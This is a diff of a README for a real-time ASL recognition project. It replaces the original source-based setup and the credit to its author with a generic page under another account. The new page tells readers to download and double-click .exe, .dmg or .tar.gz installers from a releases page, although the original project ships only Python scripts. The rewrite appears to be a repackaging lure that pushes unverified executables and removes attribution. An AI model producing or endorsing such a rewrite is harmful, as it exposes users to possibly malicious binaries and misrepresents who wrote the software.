@@ -1,161 +1,80 @@
-<p align="center">
-  <img src="https://img.shields.io/badge/Project-ASL%20Recognition-blueviolet?style=for-the-badge" />
-  <img src="https://img.shields.io/badge/Python-3.10-blue?style=for-the-badge&logo=python" />
-  <img src="https://img.shields.io/badge/OpenCV-Enabled-green?style=for-the-badge&logo=opencv" />
-  <img src="https://img.shields.io/badge/MediaPipe-Hand%20Tracking-orange?style=for-the-badge" />
-  <img src="https://img.shields.io/badge/TensorFlow-ML%20Model-FF6F00?style=for-the-badge&logo=tensorflow" />
-  <img src="https://img.shields.io/badge/Status-Stable-success?style=for-the-badge" />
-</p>
-<h1 align="center">🖐 Real-Time American Sign Language (ASL) Recognition</h1>
-<p align="center">Using MediaPipe Hand Landmarks + TensorFlow Neural Network</p>
+# 👋 ASL-Sign-Recognition - Recognize Sign Language Effortlessly
 
-# 🖐 Real-Time American Sign Language (ASL) Recognition Using Hand Landmarks
+[![Download ASL-Sign-Recognition](https://img.shields.io/badge/Download-ASL--Sign--Recognition-brightgreen)](https://github.com/Khoidoan10/ASL-Sign-Recognition/releases)
 
-This project recognizes **A–Z American Sign Language gestures in real-time** using:
-- **MediaPipe Hand Tracking** (21 hand landmarks)
-- **Custom ASL Dataset (User Captured)**
-- **MLP Deep Learning Model (42-d Landmark Features)**
-- **OpenCV for Live Video Feed**
+## 🚀 Getting Started
 
-This system is designed for **deaf & mute communication support**, gesture-controlled interfaces, and educational use.
+Welcome to the ASL-Sign-Recognition project! This system allows you to recognize American Sign Language gestures in real time using your laptop’s webcam. It's easy to set up and requires no special graphics hardware.
 
----
+### 🌟 Features
+- Tracks 21 hand landmarks for accurate motion detection
+- Classifies ASL gestures from A to Z
+- Uses MediaPipe for hand detection
+- Leverages TensorFlow for gesture classification
+- Includes tools for dataset capture and training
+- Works smoothly on any laptop (No GPU needed)
 
-## ✅ Features
-| Feature | Description |
-|--------|-------------|
-| Real-time Hand Tracking | Detects hand and draws red landmark points + connections |
-| Custom Dataset Support | User can add their own ASL samples |
-| High Accuracy | Achieves **95%–99% accuracy** on well-lit conditions |
-| Fast Training | Model trains in **5–15 minutes** (no GPU required) |
-| Lightweight Model | Uses only 42 numerical features per frame |
-| Works on Normal Laptops | No NVIDIA GPU required |
+### 🔧 System Requirements
+- Operating System: Windows, macOS, or Linux
+- Memory: At least 4 GB RAM
+- Storage: Minimum of 200 MB free space
+- Webcam: Built-in or external webcam for gesture recognition
 
----
+## 📥 Download & Install
 
-## 🛠 Tech Stack
-- **Python 3.10**
-- MediaPipe
-- OpenCV
-- TensorFlow / Keras
-- NumPy
-- Scikit-learn
+To get started with ASL-Sign-Recognition, follow these steps:
 
----
+1. Click the download link below to visit the releases page.
+   
+   [Download ASL-Sign-Recognition](https://github.com/Khoidoan10/ASL-Sign-Recognition/releases)
 
-## 🚀 Setup Instructions
+2. On the releases page, find the latest version. Look for a file labeled with a `.exe`, `.dmg`, or `.tar.gz` extension depending on your operating system.
 
-### 1. Clone / Download the Project
-git clone https://github.com/YourUsername/ASL-Sign-Recognition.git
-cd ASL-Sign-Recognition
+3. Download the file by clicking the link. Your browser will save it to your default downloads folder.
 
+4. Locate the downloaded file. 
 
+5. Run the installer by double-clicking the file. Follow the on-screen prompts to complete the installation.
 
-### 2. Create Virtual Environment (Python 3.10 Required)
-py -3.10 -m venv handenv
-handenv\Scripts\activate
+6. Once installed, open the application. Ensure your webcam is active and start recognizing ASL gestures!
 
+## 🎥 How to Use
 
+1. **Open the Application**: After installation, run the application from your applications folder or start menu.
 
-### 3. Install Dependencies
-pip install -r requirements.txt
+2. **Set Up Your Webcam**: Ensure your webcam is positioned to capture your hands clearly. 
 
+3. **Start Webcam**: Click the start button in the application to begin recognizing gestures.
 
+4. **Perform ASL Gestures**: Show the ASL gestures in front of your webcam. The application will process the video feed and provide feedback on the recognized gestures.
 
----
+5. **Review Results**: The recognized signs will appear on the screen in real time. Practice and improve your skills as you use the tool.
 
-## 🎥 Dataset Collection (A–Z Signs)
+## 🎓 Learning Resources
 
-Run dataset capture script:
-python capture_dataset.py
+- **MediaPipe**: [MediaPipe Documentation](https://google.github.io/mediapipe/)
+- **TensorFlow**: [TensorFlow Documentation](https://www.tensorflow.org/)
 
+Feel free to explore and learn more about how these technologies work together to make ASL recognition possible.
 
+## 🛠️ Troubleshooting
 
-- Enter the **letter** (A–Z).
-- Show the hand sign in front of webcam.
-- **Red dots and lines** will show tracking.
-- **200 samples per letter recommended.**
-- Press `Q` to stop and move to next letter.
+If you encounter any issues, consider the following:
 
-Your dataset will be stored like:
-dataset/
-├── A/
-├── B/
-├── C/
-└── …
+- **Webcam Not Detected**: Check if the webcam is connected and recognized by your operating system.
+- **Unrecognized Gestures**: Ensure your hands are visible and within the camera’s frame. The lighting conditions can also affect recognition—avoid bright backlighting.
+- **Performance Issues**: Close any other applications that may be using system resources. 
 
+## 📞 Support
 
+For support, you can open an issue in the repository or reach out to the community. You can find the Issues tab at the top of the repository page.
 
----
+## 🌐 Community Contributions
 
-## 🧠 Model Training
-After collecting dataset:
-python train_asl_landmarks.py
+We welcome contributions! If you would like to suggest features, improvements, or report bugs, please feel free to open an issue or pull request. Your input makes this project better!
 
+## 📂 License
 
+This project is licensed under the MIT License. You can use, modify, and distribute it freely while providing proper credit.
 
-Output Model Files:
-model/asl_landmarks_mlp.h5
-model/labels.txt
-
-
-
-Training Time: **5–18 minutes** depending on dataset size.
-
----
-
-## 🎮 Run Real-Time ASL Recognition
-python predict_asl_live.py
-
-
-
-Controls:
-| Key | Action |
-|----|--------|
-| `Q` | Quit Application |
-| `+` | Increase Confidence Threshold |
-| `-` | Decrease Confidence Threshold |
-
-Output Example:
-Pred: A (97%)
-FPS: 28
-
-
-
----
-
-## ⚠️ Warnings & Important Notes
-
-- Use **plain background** for best results  
-- Ensure **good lighting** (avoid shadows)
-- Keep hand **centered** inside webcam frame
-- **Letters J and Z involve movement**, use final stop pose for training
-- **Do NOT upload dataset to GitHub** → Add `dataset/` to `.gitignore`
-
----
-
-## 📊 Model Performance
-| Metric | Score |
-|--------|------|
-| Training Accuracy | ~97–99% |
-| Validation Accuracy | ~96–99% |
-| Real-Time Accuracy | ~90–98% (depends on lighting & distance) |
-
-**Best Performance Conditions:**
-- Stable hand
-- Good lighting
-- Clean background
-
----
-
-## 🔮 Future Enhancements (For Extra Marks)
-- Convert Recognized Gesture → **Voice Output (Text-to-Speech)**
-- Convert Continuous Letters → **Word Builder Mode**
-- Add Numbers (0–9) & Common Words (HELLO, THANK YOU, YES, NO)
-- Develop GUI App (Tkinter / PyQt / Flet)
-
----
-
-## 👨‍💻 Author
-**Project Developer:** *Shivam Soni*  
-If using in GitHub → add: Shivam09xc
+By following these instructions, you will set up the ASL-Sign-Recognition software with ease. For any other queries, feel free to explore our repository or reach out!
